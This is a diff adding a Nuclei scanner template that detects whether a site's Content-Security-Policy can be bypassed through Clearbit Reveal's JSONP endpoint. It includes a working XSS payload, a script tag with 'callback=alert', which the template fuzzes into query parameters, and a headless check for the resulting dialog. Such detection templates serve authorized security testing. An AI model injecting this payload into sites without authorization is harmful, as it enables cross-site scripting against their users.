@@ -1,0 +1,55 @@
+id: clearbit-reveal-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Clearbit Reveal
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,clearbit-reveal
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "clearbit.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: clearbit_reveal_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://reveal.clearbit.com/v1/companies/reveal?authorization=pk_5fdce9b9374f2f8a4f8c9f4a1546fa35&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "clearbit_reveal_csp_xss == true"
+# digest: 4a0a00473045022100f5b2455ac20ac8c50e8c6d59e618e197b92590cf7e434c51e3ad9d77fa075ddb02207ef45df9fa4aa705aa5444a71a8316cc02442565c546135edc1495fa9b47d7ce:922c64590222798bb761d5b6d8e72950
